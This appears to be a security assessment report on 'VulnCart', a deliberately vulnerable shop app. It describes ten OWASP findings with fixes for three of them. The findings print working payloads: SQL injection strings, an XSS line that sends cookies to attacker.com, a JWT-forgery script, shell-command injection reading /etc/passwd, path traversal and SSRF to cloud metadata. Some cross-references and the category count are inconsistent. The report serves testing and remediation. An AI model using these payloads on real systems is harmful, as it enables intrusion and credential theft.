# VulnCart — Security Assessment Report

**Target**: VulnCart (http://\<target\>)
**Tester**: \<Your Name\>
**Date**: \<Date\>
**Tools**: OWASP ZAP, Nikto, Nmap, curl, Browser DevTools

---

## Executive Summary

VulnCart was assessed for common web application vulnerabilities aligned to the OWASP Top 10 (2021). A total of **10 findings** were identified, ranging in severity from Critical to Low. Three findings were subsequently remediated and verified.

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 4 |
| Medium | 3 |
| Low | 1 |

---

## Findings

---

### Finding 1 — SQL Injection in Product Search

**OWASP Category**: A03 – Injection
**Severity**: Critical
**CVSS Score**: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Description**:
The product search endpoint passes user input directly into a SQL query without sanitization or parameterization. An attacker can manipulate the query to dump all records, bypass logic, or (in some configurations) achieve data exfiltration.

**Steps to Reproduce**:
1. Navigate to `GET /api/products/search?q=' OR '1'='1'--`
2. Observe that all products are returned regardless of the actual search term.
3. Further injection: `?q=' UNION SELECT id,username,email,password,role,1,1 FROM users--`

**Evidence**:
```
Request:  GET /api/products/search?q=' OR '1'='1'--
Response: 200 OK — returns all 20 products
```

**Impact**: Full database read access. Attacker can exfiltrate all user credentials, order history, and payment data.

**Remediation**: Use parameterized queries / prepared statements. Replace string formatting with `?` placeholders.

**Fix Implemented**: Yes — see Fix 1 in Secure Reconfiguration section.

---

### Finding 2 — Stored XSS in Product Reviews

**OWASP Category**: A03 – Injection
**Severity**: High
**CVSS Score**: 8.2 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N)

**Description**:
The review submission endpoint stores user-supplied HTML without sanitization. The React frontend renders review content via `dangerouslySetInnerHTML`, executing any script tags or event handlers embedded in the review.

**Steps to Reproduce**:
1. Log in as any user.
2. Navigate to any product page.
3. Submit the following as a review: `<script>fetch('http://attacker.com/?c='+document.cookie)</script>`
4. Any user who views the product page will trigger the payload.

**Evidence**:
```
POST /api/reviews/1
Body: {"content": "<img src=x onerror=alert(document.domain)>", "rating": 5}
→ Review stored raw in DB
→ Product page renders: <img src=x onerror=alert(document.domain)> — XSS fires
```

**Impact**: Session hijacking, credential theft, account takeover for any user who views an affected product.

**Remediation**: Sanitize input server-side with a whitelist library (e.g., bleach). Remove `dangerouslySetInnerHTML` from the frontend.

**Fix Implemented**: Yes — see Fix 2 in Secure Reconfiguration section.

---

### Finding 3 — IDOR on Order Endpoint

**OWASP Category**: A01 – Broken Access Control
**Severity**: High
**CVSS Score**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Description**:
The `/api/orders/<id>` endpoint returns order details to any authenticated user without verifying that the order belongs to the requesting user. By incrementing the order ID, an attacker can view other users' orders including shipping addresses and card digits.

**Steps to Reproduce**:
1. Log in as `alice`, place an order, note the returned `order_id` (e.g., 1).
2. Log in as `bob`.
3. Send `GET /api/orders/1` with Bob's JWT.
4. Observe Alice's full order including address and last 4 card digits.

**Evidence**:
```
GET /api/orders/1
Authorization: Bearer <bob_jwt>
→ 200 OK: {id: 1, user_id: 1, buyer: "alice", address: "123 Main St", card_last4: "4242", ...}
```

**Impact**: Full exposure of other users' shipping addresses, purchase history, and partial payment data.

**Remediation**: Add `WHERE o.user_id = current_user_id` to the order query. Verify ownership before returning data.

---

### Finding 4 — Reflected XSS in Search Error Response

**OWASP Category**: A03 – Injection
**Severity**: Medium
**CVSS Score**: 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Description**:
When a SQL error occurs during search (e.g., due to a malformed query), the backend returns the raw `q` parameter value unsanitized in the JSON error response. If this value is rendered as HTML (e.g., via `innerHTML` in a future code change, or in a browser that auto-renders), it can execute scripts.

**Steps to Reproduce**:
1. Send: `GET /api/products/search?q=<script>alert(1)</script>'`
2. The query fails due to SQLi causing a syntax error.
3. Response body: `{"error": "Search failed for query: <script>alert(1)</script>'"}`
4. If rendered as HTML (e.g., via ZAP active scan), the script executes.

**Evidence**:
```
GET /api/products/search?q=<script>alert(document.domain)</script>
→ {"error": "Search failed for query: <script>alert(document.domain)</script>", "detail": "..."}
```

**Impact**: DOM-based XSS if rendered as HTML. Attacker can craft URLs to steal cookies or execute actions on behalf of victims who click the link.

**Remediation**: HTML-encode all user input before including it in error messages. Never reflect raw input in responses.

---

### Finding 5 — Security Misconfiguration (Debug Mode + Verbose Errors)

**OWASP Category**: A05 – Security Misconfiguration
**Severity**: Medium
**CVSS Score**: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Description**:
Flask is running with `DEBUG=True` in the production environment. This exposes the interactive Werkzeug debugger on uncaught exceptions, leaks internal file paths, SQL queries, and stack traces in API error responses.

**Steps to Reproduce**:
1. Trigger a SQL error: `GET /api/products/search?q='`
2. Observe the full SQL query and Python traceback in the response body.
3. Visit any 500 error URL in the browser — the Werkzeug debugger is accessible.

**Evidence**:
```json
{"error": "Search failed for query: '", "detail": "unrecognized token: \"'%'\""}
Response headers: X-Powered-By: Flask
```

**Impact**: Information disclosure. Attacker learns internal structure, file paths, and query logic to assist further attacks.

**Remediation**: Set `DEBUG=False` in production. Implement a generic error handler that returns sanitized messages.

---

### Finding 6 — Cryptographic Failures (MD5 Passwords + Weak JWT)

**OWASP Category**: A02 – Cryptographic Failures
**Severity**: High
**CVSS Score**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description**:
User passwords are stored as unsalted MD5 hashes — a broken algorithm trivially crackable with rainbow tables. The JWT secret key is the literal string `"secret"`, and tokens have no expiration time.

**Steps to Reproduce**:
1. Gain access to the user table (via SQLi or admin panel bypass).
2. Copy any MD5 hash and crack it with: `hashcat -a 0 -m 0 hashes.txt rockyou.txt`
3. To forge a JWT: use any JWT library with secret `"secret"` and set `"role": "admin"`.

**Evidence**:
```
Admin panel users endpoint returns:
{"username": "alice", "password": "482c811da5d5b4bc6d497ffa98491e38"} (MD5 of "password123")
Cracked in < 1 second with rockyou.txt.

JWT secret: "secret" — forged admin token valid indefinitely.
```

**Impact**: Full credential compromise. Any attacker with DB read access or JWT token can gain admin privileges and impersonate any user forever (no token expiry).

**Remediation**: Use bcrypt/argon2 for password hashing. Rotate JWT secret to a cryptographically random 256-bit value. Set token expiry (e.g., 15 minutes with refresh tokens).

---

### Finding 7 — Server-Side Request Forgery (SSRF)

**OWASP Category**: A10 – SSRF
**Severity**: High
**CVSS Score**: 8.6 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N)

**Description**:
The admin "Import Product Image" feature accepts a URL and fetches it server-side without any validation. An attacker with admin access (obtained via Finding 9 — forged JWT with role:admin) can point it at internal network resources or cloud metadata endpoints.

**Steps to Reproduce**:
1. Forge an admin JWT using the weak secret (see Finding 9).
2. Send: `POST /api/admin/import-image` with the forged token.
3. Body: `{"url": "http://169.254.169.254/latest/meta-data/"}`
4. Observe the cloud metadata response in the API response body.

**Evidence**:
```
POST /api/admin/import-image
Authorization: Bearer <forged_admin_jwt>
{"url": "http://169.254.169.254/latest/meta-data/"}

Response: {"status": 200, "body": "ami-id\nami-launch-index\nhostname\niam/\n..."}
```

**Impact**: On cloud-hosted instances: full IAM credential exfiltration, internal network scanning, potential RCE via metadata service.

**Remediation**: Validate URLs against an allowlist of permitted domains. Block RFC 1918 addresses and cloud metadata ranges. Never return the full response body to the client.

---

### Finding 8 — Command Injection via Coupon Validation

**OWASP Category**: A03 – Injection
**Severity**: Critical
**CVSS Score**: 9.1 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)

**Description**:
The admin coupon validation feature passes user-supplied coupon codes directly to a shell command via `subprocess.check_output(..., shell=True)`. This allows command injection with server privileges.

**Steps to Reproduce**:
1. Forge an admin JWT using the weak secret (see Finding 9).
2. Send: `POST /api/admin/coupon` with the forged token.
3. Body: `{"code": "SAVE10; id"}`
4. Observe the output includes `uid=0(root)`.

**Evidence**:
```
POST /api/admin/coupon
Authorization: Bearer <forged_admin_jwt>
{"code": "SAVE10; cat /etc/passwd"}

Response: {"output": "Validating coupon: SAVE10\nroot:x:0:0:root:/root:/bin/bash\n..."}
```

**Impact**: Remote Code Execution as root. Full server compromise — data exfiltration, backdoor installation, lateral movement.

**Remediation**: Never pass user input to shell commands. Use a lookup table for valid coupon codes. If shell execution is needed, use `subprocess` with a list argument (no `shell=True`).

---

### Finding 9 — Broken Access Control via JWT Role Claim Trust

**OWASP Category**: A01 – Broken Access Control
**Severity**: High
**CVSS Score**: 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Description**:
All `/api/admin/*` routes authorize requests by reading the `role` claim directly from the JWT payload without verifying it against the database. Because the JWT secret is the weak string `"secret"` (see Finding 6), an attacker who discovers the secret can forge a token with `"role": "admin"` and gain full admin access without ever having an admin account.

**Steps to Reproduce**:
1. Obtain the JWT secret `"secret"` — discoverable via source code read through Finding 10, or by brute-forcing the weak secret offline.
2. Forge a token with admin role:
```python
import jwt, time
token = jwt.encode(
    {"sub": "999", "username": "hacker", "role": "admin",
     "iat": int(time.time()), "fresh": False, "jti": "x", "type": "access"},
    "secret", algorithm="HS256"
)
```
3. Send the forged token to any admin endpoint:
```
GET /api/admin/users
Authorization: Bearer <forged_token>
```
4. Receive a full dump of all users including password hashes, emails, and roles.

**Evidence**:
```
GET /api/admin/users
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<forged_payload>.<forged_sig>

Response: [{"id":1,"username":"alice","email":"alice@vulncart.io","password":"482c811d...","role":"user"}, ...]
```

**Impact**: Full admin access for any attacker who can discover or brute-force the JWT secret. Chained with Finding 6 (weak secret) and Finding 10 (path traversal to source code), this is a reliable path to privilege escalation. Combined with Findings 7 and 8 — trivial path to RCE.

**Remediation**: Never trust claims embedded in the JWT for authorization decisions. After verifying the token signature, query the database for the user's current role using the `sub` (user ID) claim. Rotate the JWT secret to a cryptographically random 256-bit value.

---

### Finding 10 — Path Traversal / Local File Inclusion

**OWASP Category**: A01 – Broken Access Control
**Severity**: High
**CVSS Score**: 7.7 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N)

**Description**:
The admin log viewer constructs a file path by directly concatenating a user-supplied filename without validation. An attacker can traverse the directory structure to read arbitrary files on the server.

**Steps to Reproduce**:
1. Forge an admin JWT using the weak secret (see Finding 9).
2. Send: `GET /api/admin/logs?file=../../etc/passwd` with the forged token.
3. Observe the contents of `/etc/passwd` in the response.

**Evidence**:
```
GET /api/admin/logs?file=../../etc/passwd
Authorization: Bearer <forged_admin_jwt>

Response: {"file": "../../etc/passwd", "content": "root:x:0:0:root:/root:/bin/bash\n..."}
```

**Impact**: Read arbitrary server files including `/etc/shadow`, application source code, private keys, environment files with secrets, and database files.

**Remediation**: Validate filenames against a strict whitelist. Use `os.path.realpath()` to resolve the canonical path and verify it starts with the expected base directory.

**Fix Implemented**: Yes — see Fix 3 in Secure Reconfiguration section.

---

## Secure Reconfiguration

The following 3 findings were remediated and verified. Set `SECURE_MODE=true` in the environment to enable patched code paths.

```bash
SECURE_MODE=true docker compose up --build
```

---

### Fix 1: SQL Injection → Parameterized Queries

**File**: `backend/routes/products.py`

**Vulnerable code**:
```python
products = db.execute(
    f"SELECT * FROM products WHERE name LIKE '%{q}%'"
)
```

**Fixed code**:
```python
products = db.execute(
    "SELECT * FROM products WHERE name LIKE ? OR description LIKE ?",
    (f"%{q}%", f"%{q}%")
)
```

**Before**:
```bash
curl "http://target/api/products/search?q=' OR '1'='1'--"
→ 200 OK — returns all 20 products
```

**After**:
```bash
curl "http://target/api/products/search?q=' OR '1'='1'--"
→ 200 OK — returns [] (empty, query treated as literal string)
```

---

### Fix 2: Stored XSS → Input Sanitization + Safe Render

**Files**: `backend/routes/reviews.py`, `frontend/src/pages/ProductDetail.jsx`

**Vulnerable code (backend)**:
```python
# content stored as-is
db.execute("INSERT INTO reviews ... VALUES (?,?,?,?,?)", (..., content))
```

**Fixed code (backend)**:
```python
content = bleach.clean(content, tags=[], strip=True)
db.execute("INSERT INTO reviews ... VALUES (?,?,?,?,?)", (..., content))
```

**Vulnerable code (frontend)**:
```jsx
<p dangerouslySetInnerHTML={{ __html: review.content }} />
```

**Fixed code (frontend)**:
```jsx
<p>{review.content}</p>
```

**Before**: Submit `<script>alert(1)</script>` as review → JavaScript executes on product page.

**After**: Submit same payload → renders as literal text: `<script>alert(1)</script>`.

---

### Fix 3: Path Traversal → Whitelist Validation

**File**: `backend/routes/admin.py`

**Vulnerable code**:
```python
filepath = f"/var/log/{filename}"
with open(filepath, "r") as f:
    content = f.read()
```

**Fixed code**:
```python
ALLOWED_LOGS = ["app.log", "access.log", "error.log"]
if filename not in ALLOWED_LOGS:
    return jsonify({"error": "Access denied: invalid log file"}), 403
filepath = os.path.join("/var/log/vulncart", filename)
```

**Before**:
```bash
curl "http://target/api/admin/logs?file=../../etc/passwd" -H "Authorization: Bearer <forged_admin_jwt>"
→ 200 OK — returns /etc/passwd contents
```

**After**:
```bash
curl "http://target/api/admin/logs?file=../../etc/passwd" -H "Authorization: Bearer <forged_admin_jwt>"
→ 403 Forbidden: {"error": "Access denied: invalid log file"}
```

---

## Conclusion

VulnCart contained critical vulnerabilities across 6 OWASP Top 10 categories. The most severe findings (SQLi + Command Injection) allow full server compromise with minimal effort. Three findings were patched with simple, targeted fixes demonstrating that secure coding practices are not expensive — they are a default.
